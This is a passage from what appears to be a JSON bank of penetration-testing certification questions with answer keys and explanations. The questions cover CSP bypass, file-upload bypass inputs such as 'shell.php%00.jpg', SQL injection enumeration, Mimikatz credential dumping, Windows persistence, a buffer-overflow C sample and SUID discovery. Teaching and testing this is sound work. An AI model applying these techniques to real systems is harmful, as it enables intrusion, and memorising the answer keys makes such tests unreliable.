              " `cat /etc/passwd`"
            ],
            "correctAnswerIndex": 1,
            "explanation": "Both `ifconfig -a` and `ip link show` will display detailed information about network interfaces. Critically, they will indicate if an interface is in promiscuous mode (usually indicated by the `PROMISC` flag). Promiscuous mode allows an interface to capture *all* network traffic on the segment, not just traffic addressed to it, which is often used for network sniffing. `ps aux` shows running processes, `netstat -tulnp` shows listening ports, and `cat /etc/passwd` shows user account information.",
            "examTip": "`ifconfig -a` or `ip link show` = Check for promiscuous mode on network interfaces (Linux)."
        },
        {
          "id": 56,
          "question": "What is the primary purpose of using 'steganography' in the context of an attack?",
          "options":[
            "To encrypt data transmitted over a network, making it unreadable to eavesdroppers.",
            "To hide the existence of data or a message within another, seemingly harmless file or message (e.g., hiding a text file within an image file), making it difficult to detect.",
            "To crack passwords using a combination of dictionary words and brute-force techniques.",
            "To scan a network for open ports and services to identify potential entry points."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Steganography is about *concealment*, not encryption. It hides the *fact* that data is being transmitted, often by embedding it within another, innocuous file (e.g., an image, audio file). Encryption protects the *content* of the data, but it's still obvious that *something* is being transmitted. Steganography is not password cracking or port scanning.",
          "examTip": "Steganography = Hiding data within other data (concealing its existence)."
        },
        {
           "id": 57,
           "question":"Which of the following is a common technique used to maintain persistence on a compromised Windows system?",
           "options":[
                "Regularly updating the operating system and all installed software.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys, Services), using WMI event subscriptions, performing DLL hijacking or DLL preloading, or installing a rootkit.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall and ensuring it is properly configured."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Persistence mechanisms ensure that an attacker can regain access even after reboots, user logouts, or the discovery and patching of the initial vulnerability. Scheduled tasks, registry modifications, malicious services, WMI event subscriptions, DLL hijacking/preloading, and rootkits are all common techniques. Updates, strong passwords, and firewalls are *defensive* measures.",
           "examTip": "Scheduled tasks, registry keys, services, WMI, DLL hijacking/preloading, rootkits = Persistence on Windows."
        },
        {
            "id": 58,
            "question": "You are performing a penetration test against a web application and discover that it is vulnerable to Cross-Site Scripting (XSS). However, the application has a Content Security Policy (CSP) in place that restricts the sources from which scripts can be loaded. What is a potential technique to bypass this CSP, assuming other vulnerabilities exist?",
            "options":[
               "Perform a denial-of-service attack against the web server.",
               "If the CSP allows scripts from a trusted domain, but that domain itself has an XSS vulnerability or an open redirect, you could potentially use that to bypass the CSP. Alternatively, if JSONP endpoints are allowed, you could try to leverage those. Finding weaknesses or misconfigurations in the CSP itself is another avenue.",
               "Attempt to crack user passwords using a brute-force attack.",
               "Perform a SQL injection attack."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Bypassing a CSP often involves finding weaknesses *in the policy itself* or leveraging *other vulnerabilities* on trusted domains. If the CSP allows scripts from a specific domain, and *that domain* has an XSS vulnerability or an open redirect, you could potentially use that to inject your malicious script. JSONP endpoints, if allowed by the CSP and improperly implemented, can also be used for XSS bypass. DoS, password cracking, and SQL injection are unrelated to CSP bypass.",
            "examTip": "CSP bypass = Find weaknesses in the policy itself, or leverage vulnerabilities on trusted domains."
        },
        {
             "id": 59,
             "question":"What is 'race condition' in the context of software security?",
             "options":[
                "A type of social engineering attack where an attacker races against time to trick a user into revealing sensitive information.",
                "A vulnerability that occurs when the correct behavior of a program or system depends on the timing or sequence of events (e.g., multiple threads accessing shared resources), and an attacker can manipulate this timing to cause unintended and potentially exploitable behavior.",
                "A method for encrypting data where the encryption key changes rapidly over time.",
                "A technique for improving the speed of network communication by prioritizing certain types of traffic."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Race conditions are timing-based vulnerabilities. They occur when multiple processes or threads access shared resources (like files, memory) concurrently, and the outcome depends on the unpredictable order in which those accesses happen. If an attacker can influence this timing, they might be able to cause unexpected behavior, potentially leading to privilege escalation, data corruption, or other security issues. It's not a social engineering attack, an encryption method, or a network performance technique.",
             "examTip": "Race condition = Exploiting timing issues in concurrent processes/threads."
        },
        {
            "id": 60,
            "question": "Analyze the following code snippet:\n```c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char *argv[]) {\n char buffer[64];\n strcpy(buffer, argv[1]);\n printf(\"Input: %s\\n\", buffer);\n return 0;\n}\n```\nWhat type of vulnerability is present in this C code, and how could it be exploited?",
            "options":[
               "Cross-Site Scripting (XSS); it can be exploited by injecting JavaScript code.",
               "Buffer overflow; it can be exploited by providing an input string longer than 63 characters (plus the null terminator) as the first command-line argument, potentially overwriting adjacent memory and controlling program execution.",
               "SQL Injection (SQLi); it can be exploited by injecting SQL code.",
               "Denial-of-Service (DoS); it can be exploited by providing a very large input string."
            ],
            "correctAnswerIndex": 1,
            "explanation": "This C code is vulnerable to a classic buffer overflow. The `strcpy()` function copies the contents of `argv[1]` (the first command-line argument) into the `buffer` array, which has a fixed size of 64 bytes.  `strcpy()` does *not* perform any bounds checking. If the input string is longer than 63 characters (plus one for the null terminator), `strcpy()` will write past the end of the `buffer`, overwriting adjacent memory on the stack. This can lead to a crash, or, more seriously, allow an attacker to control the program's execution flow (e.g., by overwriting the return address on the stack). This is *not* XSS (which is a web vulnerability), SQLi (which targets databases), or DoS (though a buffer overflow *can* cause a crash, which could be considered a DoS, the primary vulnerability is the buffer overflow itself).",
            "examTip": "C `strcpy()` with user-controlled input and fixed-size buffer = Buffer overflow vulnerability."
        },
        {
            "id": 61,
            "question": "You are performing a penetration test, and after gaining initial access to a Windows system, you want to dump password hashes. Which tool is specifically designed for this purpose and is widely recognized for its effectiveness?",
            "options": [
                "Nmap",
                "Wireshark",
                "Mimikatz",
                "Burp Suite"
            ],
            "correctAnswerIndex": 2,
            "explanation": "Mimikatz is a post-exploitation tool specifically designed to extract credentials (plaintext passwords, hashes, PIN codes, Kerberos tickets) from memory on Windows systems. It's a go-to tool for credential dumping. Nmap is a port scanner, Wireshark is a packet analyzer, and Burp Suite is a web application testing tool.",
            "examTip": "Mimikatz = Credential dumping on Windows (hashes, passwords, tickets)."
        },
        {
          "id": 62,
          "question": "What is 'LDAP injection', and how does it relate to other injection attacks?",
          "options":[
             "LDAP injection is a type of social engineering attack.",
            "LDAP injection, similar in concept to SQL injection, is an attack technique used to exploit applications that construct LDAP (Lightweight Directory Access Protocol) queries based on user input. By injecting malicious LDAP code, attackers can potentially bypass authentication, access or modify directory information, or execute arbitrary LDAP commands.",
            "LDAP injection is a method for encrypting LDAP traffic.",
            "LDAP injection is a technique for improving the performance of LDAP directory lookups."
          ],
          "correctAnswerIndex": 1,
          "explanation": "LDAP injection is an injection attack, analogous to SQL injection, but targeting LDAP directories instead of SQL databases. It exploits vulnerabilities in how applications handle user input when constructing LDAP queries.  It's not a social engineering attack, an encryption method, or a performance improvement technique.",
          "examTip": "LDAP injection = Injecting malicious LDAP queries (similar to SQLi, but for LDAP)."
        },
        {
          "id": 63,
          "question":"Which of the following is a common technique for performing a 'denial-of-service' (DoS) attack?",
          "options":[
            "Sending phishing emails to users to trick them into revealing their credentials.",
            "Flooding a target system or network with traffic (e.g., SYN floods, UDP floods, HTTP floods), consuming resources (e.g., bandwidth, CPU, memory), exploiting vulnerabilities that cause the service to crash or become unresponsive, or using amplification techniques (e.g., DNS amplification, NTP amplification).",
            "Exploiting a vulnerability in a web application to inject malicious SQL code.",
            "Cracking passwords using a brute-force or dictionary attack."
          ],
          "correctAnswerIndex": 1,
          "explanation":"DoS attacks aim to disrupt service availability. Flooding with traffic is a common method, but resource exhaustion and exploiting vulnerabilities to cause crashes can also achieve a denial of service. Phishing is social engineering, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
          "examTip": "DoS = Disrupting service availability (flooding, resource exhaustion, crashes, amplification)."
        },
        {
            "id": 64,
            "question": "You are performing a penetration test and discover a web application that allows you to upload files.  However, the application checks the file extension and only allows `.jpg`, `.png`, and `.gif` files.  What is a potential technique you could use to try and bypass this restriction and upload a malicious file (e.g., a PHP web shell)?",
            "options":[
              "Use a very strong password for your user account.",
              "Try uploading a file with a double extension (e.g., `shell.php.jpg`), a null byte injection (e.g., `shell.php%00.jpg`), or manipulating the `Content-Type` header in the upload request. Also, test for race conditions during the upload and validation process.",
              "Enable two-factor authentication for your user account.",
              "Regularly update the web browser you are using."
            ],
            "correctAnswerIndex": 1,
            "explanation": "File upload restrictions are often bypassed by manipulating the filename or the upload request. Double extensions (e.g., `shell.php.jpg`) might trick the application into checking only the last extension (`.jpg`), while the server still executes the `.php` part. Null byte injection (`shell.php%00.jpg`) can truncate the filename after the null byte, potentially bypassing extension checks. Manipulating the `Content-Type` header might also trick the application. Testing for race conditions, where the file is checked and then uploaded in separate steps, can also sometimes lead to bypass. Strong passwords, 2FA, and browser updates are good security practices, but they don't directly help bypass file upload restrictions.",
            "examTip": "File upload bypass = Double extensions, null byte injection, `Content-Type` manipulation, race conditions."
        },
        {
           "id": 65,
            "question": "What is the primary difference between 'symmetric' and 'asymmetric' encryption?",
            "options":[
              "Symmetric encryption is always more secure than asymmetric encryption.",
              "Symmetric encryption uses the *same* secret key for both encryption and decryption, while asymmetric encryption uses a *pair* of keys: a public key for encryption and a private key for decryption.",
              "Asymmetric encryption is always more secure than symmetric encryption.",
              "There is no significant difference between symmetric and asymmetric encryption."
            ],
            "correctAnswerIndex": 1,
            "explanation": "The core difference lies in the keys used. Symmetric encryption uses a *single*, shared secret key for both encryption and decryption (like a physical lock and key). Asymmetric encryption uses a *key pair*: a public key (which can be shared widely) for encryption, and a private key (which must be kept secret) for decryption (like a mailbox â€“ anyone can put mail in, but only the owner has the key to open it).  Neither is universally "more secure"; they have different strengths and weaknesses and are used in different contexts. Symmetric encryption is generally *faster*, while asymmetric encryption solves the key exchange problem.",
            "examTip": "Symmetric encryption = Same key for encryption and decryption; Asymmetric encryption = Public key for encryption, private key for decryption."
        },
        {
            "id": 66,
             "question": "Which of the following is a common technique for maintaining persistence on a compromised Windows system?",
             "options":[
                "Regularly updating the operating system and all installed software.",
                "Creating a scheduled task, modifying the registry (e.g., Run keys, RunOnce keys, Services), using WMI event subscriptions, performing DLL hijacking or DLL preloading, creating a new user account with administrator privileges (if possible), or installing a rootkit.",
                "Using a strong, unique password for the administrator account.",
                "Enabling the Windows Firewall and ensuring it is properly configured."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Persistence mechanisms ensure that an attacker can regain access even after reboots, user logouts, or the discovery and patching of the initial vulnerability. Scheduled tasks, registry modifications, malicious services, WMI event subscriptions, DLL hijacking/preloading, and rootkits are all common techniques. Creating a new user account *can* provide persistence, but it's often more easily detected than the other methods.  Updates, strong passwords, and firewalls are *defensive* measures.",
             "examTip": "Scheduled tasks, registry keys, services, WMI, DLL hijacking/preloading, rootkits, user accounts = Persistence on Windows."
        },
        {
            "id": 67,
            "question": "What is 'cross-site request forgery' (CSRF), and how does it differ from 'cross-site scripting' (XSS)?",
            "options":[
              "CSRF and XSS are the same type of vulnerability; the terms are interchangeable.",
              "CSRF involves injecting malicious scripts into web pages; XSS involves forcing users to perform unintended actions.",
              "CSRF involves forcing an authenticated user to execute unwanted actions on a web application in which they are currently logged in, *without* their knowledge or consent. XSS involves injecting malicious *client-side scripts* into web pages that are then viewed by other users.",
              "CSRF is a type of denial-of-service attack; XSS is a type of SQL injection attack."
            ],
            "correctAnswerIndex": 2,
            "explanation": "CSRF and XSS are distinct web application vulnerabilities. *CSRF* exploits the trust a web application has in a logged-in user's browser, tricking the browser into sending forged requests that the application treats as legitimate. *XSS*, on the other hand, involves injecting malicious *scripts* (usually JavaScript) into a web application, which are then executed in the browsers of *other users* who visit the affected page. CSRF is about *actions*, XSS is about *scripts*.",
            "examTip": "CSRF = Forcing unintended actions; XSS = Injecting malicious scripts."
        },
        {
            "id": 68,
            "question": "You are performing a penetration test and have discovered a web application that is vulnerable to SQL injection. You have confirmed that the database management system (DBMS) is MySQL. Which of the following techniques would be MOST effective for *enumerating* all the databases on the server?",
            "options":[
               "Using the `@@version` variable to determine the MySQL version.",
               "Querying the `information_schema.schemata` table (e.g., using a UNION SELECT statement) to retrieve the database names.",
               "Using the `xp_cmdshell` stored procedure to execute operating system commands.",
               "Using the `SLEEP()` function to introduce time delays."
            ],
            "correctAnswerIndex": 1,
            "explanation": "In MySQL, the `information_schema` database contains metadata about the database server itself. The `information_schema.schemata` table specifically contains information about all the *databases* (schemas) on the server. By injecting a `UNION SELECT` statement that queries this table, you can retrieve the database names. `@@version` shows the database version, but not the database names. `xp_cmdshell` is a SQL Server stored procedure (not MySQL). `SLEEP()` is used for time-based blind SQLi, not for direct database enumeration.",
            "examTip": "MySQL: `information_schema.schemata` = Database metadata (for SQLi enumeration)."
        },
         {
          "id": 69,
          "question": "What is 'command injection', and how does it differ from 'SQL injection'?",
          "options":[
              "Command injection and SQL injection are the same type of vulnerability; the terms are interchangeable.",
              "Command injection involves injecting malicious SQL code into a database query; SQL injection involves injecting operating system commands.",
              "Command injection involves injecting arbitrary operating system commands into an application, often through a web application or other input vector, which are then executed by the underlying operating system. SQL injection involves injecting malicious SQL code into database queries.",
              "Command injection is a type of social engineering attack; SQL injection is a type of network attack."
          ],
          "correctAnswerIndex": 2,
          "explanation": "Command injection and SQL injection are both *injection* attacks, but they target different components. *Command injection* targets the *operating system*, allowing an attacker to execute arbitrary OS commands. *SQL injection* targets the *database*, allowing an attacker to manipulate database queries. They are not the same, and they are not social engineering or (inherently) network attacks.",
          "examTip": "Command injection = OS commands; SQL injection = Database queries."
        },
        {
           "id": 70,
           "question": "Examine the following Nmap command:\n```bash\nnmap -sV -p 1-65535 --script vuln --script-args "unsafe=1" 192.168.1.100\n```\nWhat is the significance of the `--script-args "unsafe=1"` argument in this context?",
           "options":[
              "It tells Nmap to only run scripts that are considered 'safe' and non-intrusive.",
              "It tells Nmap to run even scripts that are considered 'unsafe' or intrusive, potentially causing denial-of-service or other unintended consequences on the target system.",
              "It tells Nmap to encrypt the scan results.",
              "It tells Nmap to only scan for open ports and not run any scripts."
           ],
           "correctAnswerIndex": 1,
           "explanation": "Many Nmap Scripting Engine (NSE) scripts have arguments that control their behavior. Some scripts are categorized as 'intrusive' or 'unsafe' because they might cause denial-of-service, crash services, or have other unintended side effects. By default, Nmap *won't* run these scripts unless explicitly told to do so. The `--script-args "unsafe=1"` argument *overrides* this default behavior and tells Nmap to run *all* scripts in the specified category (in this case, the `vuln` category), *including* those considered unsafe. This should only be done with extreme caution and explicit authorization, as it could disrupt the target system.",
           "examTip": "Nmap `--script-args \"unsafe=1\"` = Run *all* scripts, even potentially disruptive ones."
        },
        {
            "id": 71,
             "question": "You are performing a penetration test and discover a web application that is vulnerable to Cross-Site Scripting (XSS). The application uses a Content Security Policy (CSP) to mitigate XSS attacks. However, you notice that the CSP allows scripts from 'self' and 'https://cdn.trusteddomain.com'. You also discover that 'https://cdn.trusteddomain.com' has an open redirect vulnerability. How could you potentially bypass the CSP and exploit the XSS vulnerability?",
             "options":[
                "You cannot bypass the CSP; it is a foolproof security mechanism.",
                "You could leverage the open redirect on 'https://cdn.trusteddomain.com' to redirect the user to a URL containing your malicious JavaScript payload. Since the script would appear to originate from a trusted domain (due to the redirect), the CSP might allow it to execute.",
                "You could perform a denial-of-service attack against the web server.",
                "You could perform a SQL injection attack against the web server's database."
             ],
             "correctAnswerIndex": 1,
             "explanation": "CSP bypasses often involve finding weaknesses in the *policy itself* or leveraging *other vulnerabilities* on domains that are *trusted* by the CSP. In this case, the open redirect on `https://cdn.trusteddomain.com` provides a potential bypass. An open redirect allows an attacker to construct a URL on the trusted domain that redirects to an arbitrary location. If the attacker can craft a URL that redirects to a location containing their malicious JavaScript, and the CSP allows scripts from `https://cdn.trusteddomain.com`, the browser might execute the script, believing it originated from a trusted source. This highlights the importance of securing *all* domains trusted by a CSP. DoS and SQLi are unrelated to this specific CSP bypass scenario.",
             "examTip": "CSP bypass = Leverage vulnerabilities on trusted domains (open redirects, XSS on trusted CDN)."
        },
                 {
          "id": 72,
          "question": "What is 'token impersonation' in the context of Windows security, and how can it be used for privilege escalation?",
          "options":[
            "Token impersonation is a social engineering technique where an attacker pretends to be a legitimate user to gain access to a system.",
            "Token impersonation is a technique where an attacker with sufficient privileges on a Windows system can obtain or create an access token representing another user (often a higher-privileged user, like a service account or an administrator) and then use that token to perform actions with the impersonated user's privileges. This allows the attacker to bypass normal access controls and potentially escalate their privileges.",
            "Token impersonation is a method for encrypting data stored on a Windows system to protect it from unauthorized access.",
            "Token impersonation is a technique for improving the performance of Windows authentication by caching user credentials."
          ],
          "correctAnswerIndex": 1,
          "explanation": "Windows uses access tokens to represent the security context of a process or thread. These tokens contain information about the user's identity, group memberships, and privileges. Token impersonation allows an attacker who already has *some* level of access (often SeImpersonatePrivilege, which is frequently granted to service accounts) to 'borrow' the privileges of another user by obtaining or creating their access token. This can be a powerful privilege escalation technique. It's not a social engineering attack, an encryption method, or a performance improvement technique. Tools like `incognito` (in Metasploit) and various Windows API functions can be used for token manipulation.",
          "examTip": "Token impersonation = Using another user's access token to gain their privileges (Windows)."
        },
        {
            "id": 73,
             "question": "Which of the following is a common technique used to discover hidden files, directories, and parameters on a web server during the reconnaissance and vulnerability analysis phases of a penetration test?",
             "options":[
                "Shoulder surfing.",
                "Using a combination of techniques, including: (1) Directory brute-forcing/dictionary attacks (using tools like DirBuster, Gobuster, ffuf). (2) Analyzing the web application's source code (HTML, JavaScript) and `robots.txt` for clues. (3) Checking for common file and directory names (e.g., admin/, backup/, test/, config.php). (4) Parameter tampering and fuzzing (using tools like Burp Suite's Intruder and Repeater, or specialized tools like Arjun or Param Miner). (5) Spidering/crawling the website to discover linked and unlinked resources. (6) Examining HTTP headers for clues.",
                "Phishing.",
                "Social engineering."
             ],
             "correctAnswerIndex": 1,
             "explanation": "Discovering hidden content on web servers requires a multifaceted approach. Directory brute-forcing, source code analysis, checking `robots.txt`, parameter tampering, fuzzing, spidering, and examining HTTP headers are all valuable techniques. Shoulder surfing, phishing, and social engineering are different reconnaissance or attack methods, not directly related to finding hidden web content.",
             "examTip": "Directory brute-forcing, source code analysis, `robots.txt`, parameter tampering, fuzzing, spidering, HTTP headers = Discovering hidden web content."
        },
        {
            "id": 74,
             "question": "You are performing a penetration test and have gained access to a Linux system.  You want to determine if any network interfaces are currently operating in promiscuous mode.  Which of the following commands, and associated output interpretation, is MOST accurate for this purpose?",
             "options":[
                 "`ps aux`;  Look for processes related to network monitoring tools.",
                 "`ifconfig -a` (or `ip link show`); Look for the `PROMISC` flag in the interface configuration.",
                 "`netstat -tulnp`; Look for unusual listening ports.",
                 "`cat /etc/passwd`; Look for suspicious user accounts."
             ],
             "correctAnswerIndex": 1,
             "explanation": "`ifconfig -a` (or the newer `ip link show` command) displays detailed information about all network interfaces, including their flags. The presence of the `PROMISC` flag indicates that the interface is in promiscuous mode, meaning it's capturing *all* network traffic on the segment, not just traffic addressed to it. This is often a sign of network sniffing. `ps aux` shows running processes (which *might* include a sniffer, but the interface flag is more direct). `netstat -tulnp` shows listening ports. `cat /etc/passwd` shows user accounts.",
             "examTip": "`ifconfig -a` or `ip link show`; look for `PROMISC` flag = Check for promiscuous mode on network interfaces (Linux)."
        },
        {
           "id": 75,
           "question": "What is a 'reverse shell', and why is it often preferred over a 'bind shell' in penetration testing scenarios?",
           "options":[
                "A reverse shell is a type of firewall that blocks incoming connections; a bind shell allows incoming connections.",
                "A reverse shell is a shell connection initiated *from* the compromised target system *back* to the attacker's machine. A bind shell *listens* for incoming connections on the target machine. Reverse shells are often preferred because they are more likely to bypass firewall restrictions that commonly block incoming connections to target systems.",
                "A reverse shell is a method for encrypting data transmitted between the attacker and the target system; a bind shell is a method for decrypting data.",
                "A reverse shell is a technique for cracking passwords; a bind shell is a technique for escalating privileges."
           ],
           "correctAnswerIndex": 1,
           "explanation": "The key difference is the *direction* of the connection. A *bind shell* opens a listening port on the *target* and waits for the attacker to connect *to* it. A *reverse shell* has the *target* machine connect *back* to the attacker's machine (which is listening for the connection). Reverse shells are often preferred because firewalls on the target network are more likely to allow *outbound* connections than *inbound* connections.  They are not firewalls, encryption methods, or password cracking/privilege escalation techniques *in themselves* (though they can be *used* as part of those activities).",
           "examTip": "Reverse shell = Target connects *out* to attacker (bypasses firewalls); Bind shell = Attacker connects *in* to target."
        },
         {
          "id": 76,
          "question": "Which of the following is a common technique for performing a 'distributed denial-of-service' (DDoS) attack?",
          "options":[
            "Sending phishing emails to a large number of recipients, hoping to trick them into revealing sensitive information.",
            "Using a botnet (a network of compromised computers, often infected with malware) to flood a target system or network with traffic from *multiple* sources simultaneously, overwhelming its resources and making it unavailable to legitimate users. Common DDoS attack types include SYN floods, UDP floods, HTTP floods, and application-layer attacks.",
            "Exploiting a vulnerability in a web application to inject malicious SQL code into database queries.",
            "Cracking passwords using a brute-force or dictionary attack, trying many different password combinations."
          ],
          "correctAnswerIndex": 1,
          "explanation": "DDoS attacks involve *multiple* compromised systems (often a botnet) working together to overwhelm a target with traffic or requests, disrupting its normal operation. Phishing is social engineering, SQL injection targets databases, and brute-force/dictionary attacks target passwords.",
          "examTip": "DDoS = Distributed attack using a botnet (multiple sources) to disrupt service."
        },
        {
           "id": 77,
            "question": "You are performing a penetration test against a web application and suspect that it might be vulnerable to XML External Entity (XXE) injection.  Which of the following BEST describes how you would attempt to confirm and potentially exploit this vulnerability?",
            "options":[
             "Attempt to inject malicious JavaScript code into input fields to test for Cross-Site Scripting (XSS).",
             "Attempt to inject malicious SQL code into input fields to test for SQL Injection.",
             "Attempt to craft malicious XML input that defines and uses external entities to access local files on the server, access internal network resources, or cause a denial-of-service. You might use techniques like direct XXE, blind XXE (with out-of-band data exfiltration), and error-based XXE.",
             "Attempt to force an authenticated user to execute unintended actions on the web application by tricking their browser into sending a forged request."
            ],
            "correctAnswerIndex": 2,
            "explanation": "XXE attacks specifically target vulnerabilities in how applications parse XML input. The attacker crafts malicious XML that defines *external entities* â€“ references to external resources (like files or URLs). If the XML parser is misconfigured or doesn't properly validate these entities, the attacker can potentially read local files, access internal network resources (similar to SSRF), cause a denial-of-service, or even achieve remote code execution. XSS involves injecting JavaScript, SQLi targets databases, and CSRF forces unintended user actions.",
            "examTip": "XXE = Exploiting XML external entities to access files, internal resources, or cause DoS."
        },
        {
           "id": 78,
           "question":"What is 'LDAP injection', and how does it relate to other injection attacks like SQL injection?",
           "options":[
             "LDAP injection is a type of social engineering attack where an attacker impersonates a legitimate LDAP server to trick users into revealing their credentials.",
              "LDAP injection, similar in concept to SQL injection, is an attack technique used to exploit web applications (or other applications) that construct LDAP (Lightweight Directory Access Protocol) statements based on user input. By injecting malicious LDAP code into input fields that are not properly sanitized or validated, attackers can potentially bypass authentication, access, modify, or delete information in the directory service, or even execute arbitrary LDAP commands.",
              "LDAP injection is a method for encrypting data transmitted over a network using the LDAP protocol.",
              "LDAP injection is a technique for improving the performance of LDAP directory lookups and searches."
           ],
           "correctAnswerIndex": 1,
           "explanation": "LDAP injection, like SQL injection, is an *injection* attack. However, instead of targeting SQL databases, it targets LDAP directories (often used for user authentication and storing information about users, groups, and resources). The attacker injects malicious LDAP query components to manipulate the query and potentially gain unauthorized access or modify data. It's not a social engineering attack, an encryption method, or a performance improvement technique.",
           "examTip": "LDAP injection = Injecting malicious LDAP queries (similar to SQLi, but for LDAP directories)."
        },
        {
          "id": 79,
          "question": "You are analyzing a compromised Windows system. You suspect that an attacker may have used token impersonation to elevate privileges. Which of the following Windows tools or commands would be MOST useful for investigating this type of activity?",
          "options":[
             "Nmap",
             "Process Explorer (from Sysinternals) or Process Hacker, along with careful analysis of running processes, their associated users, and their token privileges.",
             "Wireshark",
             "Burp Suite"
          ],
          "correctAnswerIndex": 1,
          "explanation": "Process Explorer (part of the Sysinternals suite) and Process Hacker are powerful tools for examining running processes on Windows. They allow you to view detailed information about each process, including its security token, which reveals the user context and privileges associated with that process. By examining the tokens of running processes, you can potentially identify processes running with unexpectedly high privileges or those that are impersonating other users. Nmap is a port scanner, Wireshark is a network packet analyzer, and Burp Suite is a web application testing tool; none of these are directly suited for analyzing Windows process tokens.",
          "examTip": "Process Explorer/Process Hacker = Investigate Windows process tokens for privilege escalation."
        },
        {
            "id": 80,
             "question": "Examine the following Linux command:\n```bash\nfind / -perm -4000 -type f -exec ls -l {} \; 2>/dev/null\n```\nWhat is this command doing, and why is it relevant in a security assessment or penetration test?",
             "options":[
               "This command lists all files in the root directory (`/`).",
               "This command finds all files on the system with the SUID bit set, and then lists their details. This is relevant because SUID binaries run with the privileges of the file owner (often root), making them potential targets for privilege escalation.",
               "This command finds all files owned by the root user.",
               "This command finds all files that have been modified in the last 24 hours."
             ],
             "correctAnswerIndex": 1,
             "explanation": "This command is a crucial tool for identifying potential privilege escalation vulnerabilities on a Linux system. Let's break it down: * `find /`:  Starts the search from the root directory (`/`), meaning it will search the entire filesystem. * `-perm -4000`: This is the key part. It searches for files with the SUID (Set User ID) bit set.  The `-4000` represents the SUID permission in octal notation. * `-type f`:  Limits the search to regular files (not directories, links, etc.). * `-exec ls -l {} \;`: For each file found, execute the `ls -l` command (list long format, showing permissions, owner, etc.).  The `{}` is replaced by the filename found by `find`. * `2>/dev/null`:  Redirects standard error (file descriptor 2) to `/dev/null`, effectively suppressing error messages (like 'Permission denied' when trying to access directories the user doesn't have permission for).  The command is relevant because SUID binaries run with the privileges of the file *owner*, which is often `root`. If a SUID binary has vulnerabilities (e.g., buffer overflows, command injection), a local user can exploit it to gain root privileges.",
             "examTip": "`find / -perm -4000 -type f` = Find SUID binaries (potential privilege escalation on Linux)."
        },
        {
           "id": 81,
            "question": "Which of the following statements BEST describes the concept of 'defense in depth' in information security?",
            "options":[
                "Relying solely on a single, robust firewall to protect a network from all external threats.",
                "Implementing multiple, overlapping layers of security controls (including physical, technical, and administrative controls) to protect assets.  This approach recognizes that no single security control is perfect, and if one layer fails or is bypassed, other layers are in place to prevent or mitigate the attack. It involves a combination of preventative, detective, and corrective measures.",
                "Using only intrusion detection systems (IDS) and intrusion prevention systems (IPS) to monitor network traffic and block malicious activity.",
                "Encrypting all data at rest and in transit to protect it from unauthorized access, and relying solely on encryption for security."
            ],
            "correctAnswerIndex": 1,
            "explanation": "Defense in depth is about *layered security*. It uses a *combination* of different control types (physical, technical, administrative) and different control functions (preventative, detective, corrective) to create a robust security posture. A single firewall is a single point of failure. Relying solely on IDS/IPS is reactive. Encryption is an important *part* of defense in depth, but it's not the complete strategy.",
            "examTip": "Defense in depth = Multiple, overlapping layers of security controls (physical, technical, administrative; preventative, detective, corrective)."
        },
        {
          "id": 82,
          "question": "What is 'DLL hijacking', and how can it be used to escalate privileges or maintain persistence on a Windows system?",
          "options":[
            "DLL hijacking is a type of social engineering attack where an attacker tricks a user into installing a malicious DLL file.",
            "DLL hijacking is an attack where a malicious DLL (Dynamic Link Library) is placed in a location where it will be loaded by a legitimate application *instead of* the intended DLL, often exploiting the Windows DLL search order or weaknesses in application configurations. This allows the attacker's code to execute with the privileges of the vulnerable application, potentially leading to privilege escalation or persistence.",
            "DLL hijacking is a method for encrypting data stored within DLL files to protect it from unauthorized access.",
            "DLL hijacking is a technique for improving the performance of DLL files and the applications that use them."
          ],
          "correctAnswerIndex": 1,
          "explanation": "DLL hijacking exploits the way Windows applications load DLLs. The attacker places a malicious DLL in a location where it will be loaded *before* or *instead of* the legitimate DLL. This often involves taking advantage of the DLL search order (e.g., placing the malicious DLL in the application's directory, the current working directory, or a directory in the system's PATH before the directory containing the legitimate DLL).  If a privileged process (e.g., a system service) loads the malicious DLL, the attacker's code gains those privileges. It's not a social engineering attack *per se* (though social engineering *could* be used to get the malicious DLL onto the system), an encryption method, or a performance improvement technique.",
          "examTip": "DLL hijacking = Tricking an application into loading a malicious DLL (often exploiting search order or weak permissions)."
        },
         {
            "id": 83,
            "question": "You are performing a penetration test and discover a web application that is vulnerable to Cross-Site Scripting (XSS). However, the application has a Content Security Policy (CSP) in place. The CSP includes the following directive: `script-src 'self' https://cdn.example.com;`  You also discover that `https://cdn.example.com` is vulnerable to an open redirect. How could you potentially bypass the CSP and exploit the XSS vulnerability?",
            "options":[
                "You cannot bypass the CSP; it is a foolproof security mechanism.",
                "Since the CSP allows scripts from 'self' (the application's own domain) and 'https://cdn.example.com', and `https://cdn.example.com` has an open redirect, you could potentially craft a URL on `https://cdn.example.com` that redirects to a location containing your malicious JavaScript payload. The browser might execute the script, believing it originated from the trusted CDN.",
                "You could perform a denial-of-service (DoS) attack against the web server.",
                "You could perform a SQL injection attack against the web server's database."
            ],
            "correctAnswerIndex": 1,
            "explanation": "CSP bypasses often involve finding weaknesses in the *policy itself* or leveraging *other vulnerabilities* on domains that are *trusted* by the CSP. In this case, the open redirect on `https://cdn.example.com` provides a potential bypass. An open redirect allows an attacker to construct a URL on a trusted domain that redirects to an *arbitrary* location. If the attacker can craft a URL on `https://cdn.example.com` that redirects to a location containing their malicious JavaScript, and the CSP allows scripts from `https://cdn.example.com`, the browser might execute the script, believing it originated from a trusted source.  This highlights the importance of securing *all* domains trusted by a CSP.  DoS and SQLi are unrelated to this specific CSP bypass scenario.",
            "examTip": "CSP bypass = Leverage vulnerabilities (open redirects, XSS) on domains *trusted* by the CSP."
        },
         {
            "id": 84,
            "question":"What is 'pass-the-ticket' (PtT), and how does it differ from 'pass-the-hash' (PtH)?",
            "options":[
              "PtT and PtH are different names for the same attack; both involve using stolen NTLM hashes.",
              "PtT involves using a captured or forged Kerberos ticket to authenticate to a service *without* needing the user's password or password hash. PtH involves using a captured NTLM hash to authenticate, also without needing the plaintext password. They target different authentication mechanisms.",
              "PtT involves cracking a user's password, while PtH involves stealing a user's password.",
              "PtT is a type of social engineering attack, while PtH is a type of network sniffing attack."
            ],
            "correctAnswerIndex": 1,
